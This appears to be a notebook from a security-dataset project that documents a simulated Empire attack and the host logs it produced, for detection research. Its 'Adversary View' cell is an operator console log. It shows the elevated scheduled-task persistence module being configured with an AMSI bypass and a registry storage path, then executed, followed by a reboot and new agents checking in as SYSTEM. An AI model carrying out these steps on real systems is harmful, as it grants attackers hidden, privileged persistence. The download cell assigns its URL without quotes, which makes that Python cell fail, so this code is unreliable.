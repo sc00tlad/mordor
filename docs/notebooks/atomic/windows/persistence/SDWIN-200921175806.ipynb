{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f5fce78a",
   "metadata": {},
   "source": [
    "# Empire Elevated Scheduled Tasks"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c831a37c",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a3fd2c60",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/21 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |\n",
    "| Techniques        | [T1053.005](https://attack.mitre.org/techniques/T1053/005) |\n",
    "| Tags              | Local Scheduled Tasks |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e784ab8",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3dfbdbfd",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f460a48",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_execution_elevated_user.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_execution_elevated_user.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "720468d1",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "694c05c1",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b98ef02",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [schtasks](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "267565bd",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------          \n",
    "5LKFT4WY ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7172   5/0.0    2020-09-21 21:28:46  http            \n",
    "M43EPU58 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5088   5/0.0    2020-09-21 21:43:06  http            \n",
    "\n",
    "4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:57:21  http            \n",
    "\n",
    "(Empire: agents) > interact 4SUZ8X62\n",
    "(Empire: 4SUZ8X62) > usemodule persistence/elevated/schtasks*\n",
    "(Empire: powershell/persistence/elevated/schtasks) > set AMSIBypass2 True\n",
    "(Empire: powershell/persistence/elevated/schtasks) > set TaskName MordorElevated\n",
    "(Empire: powershell/persistence/elevated/schtasks) > info\n",
    "\n",
    "              Name: Invoke-Schtasks\n",
    "            Module: powershell/persistence/elevated/schtasks\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) using schtasks running as\n",
    "  SYSTEM. This has a moderate detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        4SUZ8X62                  Agent to run module on.                 \n",
    "  Listener         False       http                      Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       True                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  DailyTime        False                                 Daily time to trigger the script        \n",
    "                                                        (HH:mm).                                \n",
    "  IdleTime         False                                 User idle time (in minutes) to trigger  \n",
    "                                                        script.                                 \n",
    "  OnLogon          False       True                      Switch. Trigger script on user logon.   \n",
    "  TaskName         True        MordorElevated            Name to use for the schtask.            \n",
    "  RegPath          False       HKLM:\\Software\\Microsoft  Registry location to store the script   \n",
    "                              \\Network\\debug            code. Last element is the key name.     \n",
    "  ADSPath          False                                 Alternate-data-stream location to store \n",
    "                                                        the script code.                        \n",
    "  ExtFile          False                                 Use an external file for the payload    \n",
    "                                                        instead of a stager.                    \n",
    "  Cleanup          False                                 Switch. Cleanup the trigger and any     \n",
    "                                                        script from specified location.         \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/elevated/schtasks) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked 4SUZ8X62 to run TASK_CMD_WAIT\n",
    "[*] Agent 4SUZ8X62 tasked with task ID 1\n",
    "[*] Tasked agent 4SUZ8X62 to run module powershell/persistence/elevated/schtasks\n",
    "(Empire: powershell/persistence/elevated/schtasks) > \n",
    "SUCCESS: The scheduled task \"MordorElevated\" has successfully been created.\n",
    "Schtasks persistence established using listener http stored in HKLM:\\Software\\Microsoft\\Network\\debug with MordorElevated OnLogon trigger.\n",
    "\n",
    "(Empire: powershell/persistence/elevated/schtasks) > back\n",
    "(Empire: 4SUZ8X62) > shell shutdown /r\n",
    "[*] Tasked 4SUZ8X62 to run TASK_SHELL\n",
    "[*] Agent 4SUZ8X62 tasked with task ID 2\n",
    "(Empire: 4SUZ8X62) > \n",
    "..Command execution completed.\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent Y2ADR48N checked in\n",
    "[*] New agent D43KCT91 checked in\n",
    "[+] Initial agent Y2ADR48N from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to Y2ADR48N at 172.18.39.5\n",
    "[+] Initial agent D43KCT91 from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to D43KCT91 at 172.18.39.5\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------          \n",
    "5LKFT4WY ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7172   5/0.0    2020-09-21 21:28:46  http            \n",
    "M43EPU58 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5088   5/0.0    2020-09-21 21:43:06  http            \n",
    "\n",
    "4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n",
    "Y2ADR48N ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         620    5/0.0    2020-09-21 22:01:50  http            \n",
    "D43KCT91 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         636    5/0.0    2020-09-21 22:01:51  http            \n",
    "\n",
    "(Empire: agents) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a87a1a6a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "53fb0859",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ed07d95",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_execution_elevated_user.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d15516ea",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab32164c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff4a4847",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34f0893e",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a3508ed8",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/](https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
